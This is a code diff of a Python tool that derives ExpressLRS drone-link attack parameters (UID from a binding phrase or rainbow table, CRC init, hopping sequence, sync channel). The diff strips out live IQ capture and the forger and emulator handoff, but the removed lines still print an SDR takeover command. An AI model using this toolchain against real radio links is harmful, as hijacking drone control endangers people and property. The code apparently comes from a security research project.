@@ -1,53 +1,49 @@
 #!/usr/bin/env python3
 """
-ELRS Attack Profile Generator — Capture-to-attack-parameters processor
+ELRS Attack Profile Generator — offline, source-derived parameters
 
-Ties the Chain 1 passive-capture tools together into one command. Takes raw
-input (IQ file, pre-demodulated frames, WiFi config JSON, manual UID, or
-binding phrase) and outputs a complete JSON attack profile with every
-parameter the packet forger and TX emulator need.
+Derives offline parameters from a supplied UID, phrase, or structured file.
+It does not decode raw IQ or validate the live E8-TinyHawk link.
 
 Input sources (pick one):
   --phrase TEXT       Binding phrase (derive UID via MD5)
   --uid HEX          Manual 6-byte UID in hex (e.g. aa:bb:cc:dd:ee:ff)
   --wifi-json FILE   WiFi config JSON from elrs-wifi-extract.py
-  --sync-json FILE   SYNC capture JSON from elrs-sync-capture.py
-  --iq-file FILE     IQ capture file (runs elrs-sync-capture.py internally)
+  --sync-json FILE   Externally decoded SYNC JSON (not independently verified)
+  --iq-file FILE     Reserved; fails closed until a validated IQ byte decoder exists
   --rainbow-match U4:U5  UID[4]:UID[5] hex pair to look up in rainbow table
 
 Output:
-  A JSON "attack profile" containing UID, CRC init, FHSS seed, full hopping
-  sequence, sync channel, sync word, and rate parameters — everything needed
-  by elrs-packet-forger.py and elrs-tx-emulator.py.
+  A JSON profile containing source-derived UID, CRC init, FHSS seed, hopping
+  sequence, sync channel, sync word, and rate parameters. Output includes
+  private UID material; keep saved profiles under ignored work/.
 
 Validation:
-  The profile includes a self-check: a synthetic SYNC packet is built from
-  the derived parameters and its CRC is verified round-trip. If this fails,
-  the profile is marked invalid.
+  The profile includes only a synthetic self-check: a SYNC packet is built
+  from the derived parameters and its CRC is verified round-trip. It does
+  not validate any real captured bytes or receiver acceptance.
 
 Usage:
     # From binding phrase (known phrase attack)
-    elrs-attack-profile.py --phrase "iloveflying" -o profile.json
+    elrs-attack-profile.py --phrase "iloveflying" -o work/profile.json
 
     # Dry-run with test phrase
     elrs-attack-profile.py --dry-run
 
     # From WiFi config extract
-    elrs-attack-profile.py --wifi-json extracted_config.json -o profile.json
+    elrs-attack-profile.py --wifi-json extracted_config.json -o work/profile.json
 
     # From SYNC capture output
-    elrs-attack-profile.py --sync-json sync_results.json -o profile.json
+    elrs-attack-profile.py --sync-json sync_results.json -o work/profile.json
 
     # From manual UID (e.g. from SYNC packet observation + rainbow lookup)
-    elrs-attack-profile.py --uid aa:bb:cc:dd:ee:ff -o profile.json
+    elrs-attack-profile.py --uid aa:bb:cc:dd:ee:ff -o work/profile.json
 
     # From UID[4:5] via rainbow table lookup
     elrs-attack-profile.py --rainbow-match 3a:e2 \\
-        --rainbow tools/elrs-rainbow-table.json -o profile.json
+        --rainbow tools/elrs-rainbow-table.json -o work/profile.json
 
-    # From IQ file (invokes sync capture internally)
-    elrs-attack-profile.py --iq-file capture.iq --sample-rate 4e6 \\
-        --center-freq 2440e6 --rainbow tools/elrs-rainbow-table.json
+    # Raw IQ cannot produce a profile until packet-byte decoding is validated
 
     # Pretty-print profile to stdout
     elrs-attack-profile.py --phrase "iloveflying" --pretty
@@ -63,10 +59,7 @@ from __future__ import annotations
 import argparse
 import hashlib
 import json
-import os
-import subprocess
 import sys
-import time
 from datetime import datetime, timezone
 from pathlib import Path
 
@@ -103,10 +96,10 @@ from elrs_core.v3_compat import (
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-PROFILE_VERSION = 1
+PROFILE_VERSION = 2
 ISM2G4_FREQ_COUNT = 80
 
-RATE_INTERVAL_US = {
+V4_RATE_INTERVAL_US = {
     0: 2000,    # 500 Hz
     1: 4000,    # 250 Hz
     2: 5000,    # 200 Hz
@@ -116,9 +109,18 @@ RATE_INTERVAL_US = {
     6: 40000,   # 25 Hz
 }
 
-RATE_NAMES = {
+V4_RATE_NAMES = {
     0: "500Hz", 1: "250Hz", 2: "200Hz", 3: "150Hz",
     4: "100Hz", 5: "50Hz", 6: "25Hz",
+}
+
+# Betaflight 4.4.2 src/main/rx/expresslrs_common.c, USE_RX_SX1280 row.
+# These are rate indexes, not the newer standalone ELRS 4.x enum values.
+V3_RATE_CONFIG = {
+    0: ("500Hz", 2000),
+    1: ("250Hz", 4000),
+    2: ("150Hz", 6666),
+    3: ("50Hz", 20000),
 }
 
 
@@ -237,68 +239,6 @@ def uid_from_rainbow_lookup(uid4: int, uid5: int, rainbow_path: str) -> bytes:
     return bytes(best["uid"])
 
 
-def run_sync_capture(iq_file: str, sample_rate: float, center_freq: float,
-                     rainbow_path: str | None) -> tuple[bytes, dict]:
-    """Run elrs-sync-capture.py on an IQ file and extract the UID."""
-    capture_script = _TOOLS_DIR / "elrs-sync-capture.py"
-    if not capture_script.exists():
-        raise FileNotFoundError(f"elrs-sync-capture.py not found at {capture_script}")
-
-    cmd = [
-        sys.executable, str(capture_script),
-        "--iq-file", iq_file,
-        "--sample-rate", str(sample_rate),
-        "--center-freq", str(center_freq),
-        "--one-shot",
-        "--json-output",
-    ]
-    if rainbow_path:
-        cmd.extend(["--rainbow", rainbow_path])
-
-    log(f"Running SYNC capture: {' '.join(cmd)}")
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-
-    if result.returncode != 0:
-        raise RuntimeError(
-            f"elrs-sync-capture.py failed (exit {result.returncode}):\n{result.stderr}"
-        )
-
-    # Parse JSON output from stdout
-    try:
-        data = json.loads(result.stdout)
-    except json.JSONDecodeError:
-        raise RuntimeError(
-            f"elrs-sync-capture.py output was not valid JSON:\n{result.stdout[:500]}"
-        )
-
-    return uid_from_sync_json_data(data)
-
-
-def uid_from_sync_json_data(data: dict | list) -> tuple[bytes, dict]:
-    """Extract UID from parsed sync capture data (same logic as uid_from_sync_json)."""
-    results = data if isinstance(data, list) else [data]
-    for result in results:
-        matches = result.get("rainbow_matches", [])
-        if matches:
-            best = matches[0]
-            uid_hex = best.get("uid_hex", "")
-            if uid_hex and len(uid_hex.replace(":", "")) == 12:
-                return bytes.fromhex(uid_hex.replace(":", "")), result
-            uid_bytes = best.get("uid", [])
-            if len(uid_bytes) == 6:
-                return bytes(uid_bytes), result
-
-        uid_hex = result.get("uid_hex", "")
-        if uid_hex and len(uid_hex.replace(":", "")) == 12:
-            return bytes.fromhex(uid_hex.replace(":", "")), result
-
-        uid = result.get("uid", [])
-        if isinstance(uid, list) and len(uid) == 6:
-            return bytes(uid), result
-
-    raise ValueError("SYNC capture produced no full UID match")
-
-
 # ---------------------------------------------------------------------------
 # Seed and CRC derivation
 # ---------------------------------------------------------------------------
@@ -326,11 +266,21 @@ def sync_channel_for_version(ota_version: int,
 
 def build_profile(uid: bytes, ota_version: int = 3,
                   domain_name: str = DEFAULT_2G4_DOMAIN,
-                  rate_enum: int = 4,
+                  rate_enum: int = 2,
                   source_info: dict | None = None) -> dict:
-    """Build the complete attack profile from a 6-byte UID."""
+    """Build source-derived parameters from a UID, not RF validation."""
     if len(uid) != 6:
         raise ValueError(f"UID must be 6 bytes, got {len(uid)}")
+    if ota_version == 3:
+        if rate_enum not in V3_RATE_CONFIG:
+            raise ValueError("Betaflight 4.4.2 SX1280 rate index must be 0..3")
+        rate_name, interval_us = V3_RATE_CONFIG[rate_enum]
+    elif ota_version == 4:
+        if rate_enum not in V4_RATE_NAMES:
+            raise ValueError("ELRS 4.x rate enum must be 0..6")
+        rate_name, interval_us = V4_RATE_NAMES[rate_enum], V4_RATE_INTERVAL_US[rate_enum]
+    else:
+        raise ValueError(f"unsupported OTA version: {ota_version}")
 
     domain = DOMAINS[domain_name]
     freq_count = domain.freq_count
@@ -404,25 +354,14 @@ def build_profile(uid: bytes, ota_version: int = 3,
 
         "rate": {
             "enum": rate_enum,
-            "name": RATE_NAMES.get(rate_enum, f"unknown({rate_enum})"),
-            "interval_us": RATE_INTERVAL_US.get(rate_enum, 0),
+            "name": rate_name,
+            "interval_us": interval_us,
+            "index_semantics": "Betaflight 4.4.2 SX1280 index" if ota_version == 3 else "ELRS 4.x enum",
         },
 
-        "packet_forger_args": {
-            "note": "Pass these to elrs-packet-forger.py or reconstruct from UID",
-            "uid_hex": uid.hex(),
-            "ota_version": ota_version,
-            "crc_init": crc_init,
-            "fhss_seed": fhss_seed,
-            "sync_channel": sync_channel,
-        },
-
-        "tx_emulator_args": {
-            "note": "Parameters for elrs-tx-emulator.py",
-            "uid_hex": uid.hex(),
-            "ota_version": ota_version,
-            "rate_enum": rate_enum,
-            "sync_channel": sync_channel,
+        "tool_handoff": {
+            "status": "blocked",
+            "reason": "Real packet bytes, PHY, and version-specific forger/TX behavior are not validated",
         },
 
         "validation": validation,
@@ -439,7 +378,8 @@ def _validate_profile(uid: bytes, ota_version: int, crc_init: int,
                       rate_enum: int, is_full: bool) -> dict:
     """Build a synthetic SYNC packet and verify CRC round-trip."""
     try:
-        fhss_index = fhss_seq[0] if fhss_seq else sync_channel
+        # The SYNC field is a position in the sequence, not its channel value.
+        fhss_index = 0
 
         if ota_version == 3:
             sync_pkt = v3_build_sync(
@@ -469,7 +409,8 @@ def _validate_profile(uid: bytes, ota_version: int, crc_init: int,
         seq_starts_sync = (len(fhss_seq) > 0 and fhss_seq[0] == sync_channel)
 
         return {
-            "status": "valid" if (crc_ok and seq_starts_sync) else "FAILED",
+            "status": "synthetic_only" if (crc_ok and seq_starts_sync) else "FAILED",
+            "real_capture_validated": False,
             "crc_round_trip": crc_ok,
             "fhss_starts_with_sync": seq_starts_sync,
             "test_sync_packet_hex": sync_pkt.hex(),
@@ -506,7 +447,7 @@ def print_summary(profile: dict) -> None:
     print(f"  Sync channel:   {fhss['sync_channel']} ({fhss['sync_channel_freq_mhz']} MHz)", file=sys.stderr)
     print(f"  Sequence len:   {fhss['sequence_length']}", file=sys.stderr)
     print(f"  Rate:           {rate['name']} ({rate['interval_us']} us)", file=sys.stderr)
-    print(f"  Validation:     {val['status']}", file=sys.stderr)
+    print(f"  Self-check:     {val['status']} (no real packet bytes validated)", file=sys.stderr)
     if val.get("test_sync_packet_hex"):
         print(f"  Test SYNC pkt:  {val['test_sync_packet_hex']}", file=sys.stderr)
     print(f"\n  First 20 hops:  {fhss['sequence'][:20]}", file=sys.stderr)
@@ -525,22 +466,14 @@ def print_summary(profile: dict) -> None:
 
 
 def print_commands(profile: dict) -> None:
-    """Print example commands that consume this profile."""
-    uid_hex = profile["uid"]["hex"]
-    ota_v = profile["ota_version"]
-
-    print("\n--- Packet Forger Commands ---", file=sys.stderr)
-    print(f"  # Show derived parameters", file=sys.stderr)
-    print(f"  python3 elrs-packet-forger.py --phrase <PHRASE> --ota-version {ota_v} info\n", file=sys.stderr)
-    print(f"  # Generate SYNC packet", file=sys.stderr)
-    print(f"  python3 elrs-packet-forger.py --phrase <PHRASE> --ota-version {ota_v} sync\n", file=sys.stderr)
-
-    print("--- TX Emulator Commands ---", file=sys.stderr)
-    print(f"  # Dry-run (show parameters, no TX)", file=sys.stderr)
-    print(f"  python3 elrs-tx-emulator.py --phrase <PHRASE> --ota-version {ota_v} info\n", file=sys.stderr)
-    print(f"  # Takeover via SDR (REQUIRES --arm)", file=sys.stderr)
-    print(f"  python3 elrs-tx-emulator.py --phrase <PHRASE> --ota-version {ota_v} "
-          f"--backend sdr --arm takeover\n", file=sys.stderr)
+    """Print only the offline verification step appropriate to this evidence."""
+    print("\n--- Offline verification only ---", file=sys.stderr)
+    print("  Profile self-check is synthetic; it does not validate captured bytes.", file=sys.stderr)
+    print("  Keep private frames and UID under ignored work/.", file=sys.stderr)
+    if profile["ota_version"] == 3:
+        print("  python3 tools/elrs-v3-frame-check.py --input work/candidates.jsonl "
+              "--uid-file work/private-uid.hex --json", file=sys.stderr)
+    print("  RF transmission remains disabled by the project safety gate.\n", file=sys.stderr)
 
 
 # ---------------------------------------------------------------------------
@@ -566,22 +499,15 @@ def main() -> int:
     src_excl.add_argument("--sync-json", metavar="FILE",
                           help="SYNC capture JSON from elrs-sync-capture.py")
     src_excl.add_argument("--iq-file", metavar="FILE",
-                          help="IQ capture file (runs elrs-sync-capture.py)")
+                          help="Unavailable: no validated IQ-to-packet-byte decoder yet")
     src_excl.add_argument("--rainbow-match", metavar="U4:U5",
                           help="UID[4]:UID[5] hex pair for rainbow table lookup")
     src_excl.add_argument("--dry-run", action="store_true",
                           help='Generate profile using test phrase "default"')
 
-    # IQ capture options
-    iq = parser.add_argument_group("IQ capture options (with --iq-file)")
-    iq.add_argument("--sample-rate", type=float, default=4e6,
-                    help="IQ sample rate in Hz (default: 4e6)")
-    iq.add_argument("--center-freq", type=float, default=2440e6,
-                    help="IQ center frequency in Hz (default: 2440e6)")
-
     # Rainbow table
     parser.add_argument("--rainbow", metavar="FILE",
-                        help="Rainbow table JSON (for --rainbow-match or --iq-file)")
+                        help="Rainbow table JSON (for --rainbow-match)")
 
     # Protocol options
     proto = parser.add_argument_group("protocol options")
@@ -590,8 +516,8 @@ def main() -> int:
     proto.add_argument("--domain", default=DEFAULT_2G4_DOMAIN,
                        choices=list(DOMAINS.keys()),
                        help=f"Regulatory domain (default: {DEFAULT_2G4_DOMAIN})")
-    proto.add_argument("--rate", type=int, default=4, choices=range(7),
-                       help="ELRS rate enum: 0=500Hz..6=25Hz (default: 4=100Hz)")
+    proto.add_argument("--rate", type=int, default=2, choices=range(7),
+                       help="Rate index/enum; BF4.4.2 SX1280: 0=500, 1=250, 2=150, 3=50Hz (default: 2)")
 
     # Output options
     out = parser.add_argument_group("output options")
@@ -642,17 +568,11 @@ def main() -> int:
             log(f"Extracted UID from SYNC capture: {uid.hex()}")
 
         elif args.iq_file:
-            uid, capture_data = run_sync_capture(
-                args.iq_file, args.sample_rate, args.center_freq,
-                args.rainbow,
+            raise ValueError(
+                "IQ-to-packet-byte decoding is not validated for SX1280 long "
+                "interleaving; no profile can be derived from raw IQ yet. "
+                "Use independently decoded, CRC-checked bytes offline."
             )
-            source_info = {
-                "type": "iq_capture",
-                "file": args.iq_file,
-                "sample_rate": args.sample_rate,
-                "center_freq": args.center_freq,
-            }
-            log(f"Extracted UID from IQ capture: {uid.hex()}")
 
         elif args.rainbow_match:
             parts = args.rainbow_match.split(":")
@@ -691,16 +611,20 @@ def main() -> int:
         return 1
 
     # Build the profile
-    profile = build_profile(
-        uid=uid,
-        ota_version=args.ota_version,
-        domain_name=args.domain,
-        rate_enum=args.rate,
-        source_info=source_info,
-    )
+    try:
+        profile = build_profile(
+            uid=uid,
+            ota_version=args.ota_version,
+            domain_name=args.domain,
+            rate_enum=args.rate,
+            source_info=source_info,
+        )
+    except ValueError as e:
+        print(f"ERROR: {e}", file=sys.stderr)
+        return 1
 
     # Validate
-    if profile["validation"]["status"] != "valid":
+    if profile["validation"]["status"] != "synthetic_only":
         log(f"WARNING: Profile validation FAILED: {profile['validation']}")
 
     # Output
